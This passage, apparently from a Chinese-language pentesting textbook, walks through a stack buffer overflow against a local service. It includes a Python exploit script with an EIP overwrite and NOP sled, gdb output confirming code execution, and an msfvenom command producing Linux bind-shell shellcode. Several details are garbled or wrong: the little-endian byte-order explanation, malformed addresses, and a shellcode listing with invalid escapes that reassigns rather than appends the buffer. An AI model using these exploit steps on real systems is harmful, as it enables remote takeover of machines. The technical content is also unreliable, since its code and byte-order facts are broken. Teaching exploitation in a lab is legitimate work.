
这是一个被调用以实际崩溃应用程序的额外函数。因此我们知道在那个区域附近应该有一个安全的跳转位置。为了万无一失，我们可以创建一个 NOP 链（NOP sled），或者说由 NOP 指令组成的填充区域，这些指令告诉程序什么都不做并继续执行。NOP 是一种不任何操作并继续执行的计算机指令。通过添加这些 NOP 指令，我们可以为我们的代码创建一个着陆平台。让我们根据获得的新信息来修改代码。

```python
#!/usr/bin/python
import socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
eip = "\x30\xcc\xff\xff"
buf = "\A"*268 + eip + "\x90"*32
buf += "\xCC"*(1024-len(buf))
s.connect((host, port))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close
```

我们在这里看到了几处修改。我们修改了 EIP 值，并将其设置为栈上某个空格的值。x86 平台是小端序（little endian），我们必须以反向顺序放置跳转位置。这使得 0xffffcc30 变成了 0x30ffff。接下来，我们更新了缓冲区以包含额外的 32 字节 NOP 指令（0x90）。最后，我们将缓冲区的最后部分从 'C' 改为 "\xCC"。这是 INT 中断的代码，它将导致调试器停止。这将告诉我们在运行代码后，我们的代码已经成功执行。让我们试一试吧。

# 注意

小端序（little endian）一词是计算机科学家用来定义硬件读取数据顺序的术语。在大端序（big endian）格式中（如果存在小端序，就应该有一个大端序，对吧？），对于小端序，它是反转的！在我们的示例中，注意我们并没有完全反转字符串；而是保留了数字对，并翻转了它们。我们改变了序列对中字节的顺序以反转字节序，但没有反转字节本身。例如，ABCD 不会变成 DCBA。它变成了 DCAB。

图 9.7 展示了我们能够在应用程序内执行任意代码的能力。EIP 正在运行一系列 `int3` 命令这一事实表明，它运行在位于 NOP 链之后的 "0xcc" 命令中。现在我们正在执行 INT 命令，是时候让它做些更有趣的事情并运行自定义的 shellcode 了。

```text
File Edit View Search Terminal Help
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGTRAP, Trace/breakpoint trap.
0ffffcc29 in ??
(gdb) x/5i $eip
=> 0xffffffcc29: int3
0ffffcc2a: int3
0ffffcc2b: int3
0ffffcc2c: int3
0ffffcc2d: int3
(gdb)
```

# **图 9.7** 验证对 EIP 的控制以及我们代码的执行。

## 添加 Shellcode

现在我们已经控制了应用程序的执行，是时候向我们的脚本添加自定义的 shellcode 了。这将允许我们在应用程序内执行任意代码。这意味着，如果我们的应用程序以管理员身份在机器上运行，我们的代码将拥有相同的权限。遗憾的是，shellcode 并不是从树上长出来的，所以我们必须生成它。

> 注意
> 当我们提到 shellcode 时，我们指的是注入到进程中的代码。这段代码通常会产生对机器的 shell 访问，但该术语泛泛用于描述我们将注入到应用程序中的任何二进制代码。当我们构建漏洞利用（exploit）时，执行 shellcode 是获取远程系统的最终步骤之一。我们通过重定向被利用应用程序的执行流来执行 shellcode，从而执行这些任意指令。我们的 shellcode 由这些指令组成。

Metasploit 框架有一个工具可以帮助我们向漏洞利用中添加 shellcode，称为 msfvenom。`msfvenom` 工具允许我们生成用于执行任务的 shellcode，并对其进行编码，以排除那些可能被应用程序解释的字符。对于我们的示例，我们将使用一个仅会启动网络监听器的负载（payload）。

Metasploit 中有两种负载：分阶段的（staged）和单阶段的（single），分阶段负载会通过网络加载第二部分，而单阶段负载包含了完成漏洞利用所需的所有代码。我们的 Linux 绑定 shell 的分阶段版本是 "linux/x86/shell/bind_tcp"，而单阶段版本是 "linux/x86/shell_bind_tcp"。我们将使用 "linux/x86/shell_bind_tcp" 模块，它有一个必须设置的选项；LPORT 或监听端口。

在我们的示例中，我们需要做几件事。我们需要用 Python 生成代码并将其添加到脚本中。我们需要确保 shellcode 不包含可能过早结束我们字符串的字符。这些字符通常是空字符（NULL character，它作为字符串终止符）、换行符和回车符。当我们将这些结合在一起，就得到了命令 "msfvenom -p linux/x86/shell_bind_tcp -b \x00\xa\xd" -f python LPORT=8675"，如图 9.8 所示。

# 提示
> 有关“坏字符”（bad characters）的更多信息，请参考 Metasploit 条目：http://www.exploit-db.com/Metasploit/Dealing_with_bad。

```text
root@kali:~# msfvenom -p linux/x86/shell_bind_tcp -b "\x00\xa\xd" -f python LPORT=8675
No platform selected, choosing Msf:Module:Platform:Linux Arch: from the payload
Found 10 compatible encoders
Attempting to encode payload with 0 iterations of x86/shell_bind_tcp succeeded with size 185
x86/shell_bind_tcp chosen with final Payload_size: 185 bytes
buf = "\xd3\xd3\xb61\x63\x6e\x74\xcc\xd1\x74\x24\x58\x33"
buf = "\xc9\xb1\x14\x31\x68\x19\x83\x68\x68"
...（此处省略）
```

使用 msfvenom 生成 shellcode。

我们的 Python 代码输出如下：
```python
buf = "\xd3\xd3\xb61\x63\x6e\x74\xcc\xd1\x74\x24\x58\x33"
buf = "\xc9\xb1\x14\x31\x68\x19\x83\x68\x68\x83\x68\x00\x0"
buf = "\x45\xd1\xb5\xf5\x64\xaa\xf8\x63\x6e\xe9a"
buf = "\x9b\xbe\xf0\x80\x3d\x3d\x98\x34\xc2\x53"
buf = "\x65\6b\xd2\xd3\x63\x76\x75\x79\x78\x70\x85\x42"
buf = "\x7e\x77\xe3\x69\xfe\x34\x5c\x17\x33\x0f\xal"
buf = "\x04\x68\xff\xb5\xf5\x64\xaa\xf8\x63\x6e\xe9a"
buf = "\x9b\xbe\xf0\x80\x3d\x3d\x98\x34\xc2\x53"
buf = "\x1f\x09\xec\x32\xe9\x2e\xbe\x99\x60\x51\x8e\x15\xbe"
buf = "\x90"* (1024-len(buf))
```
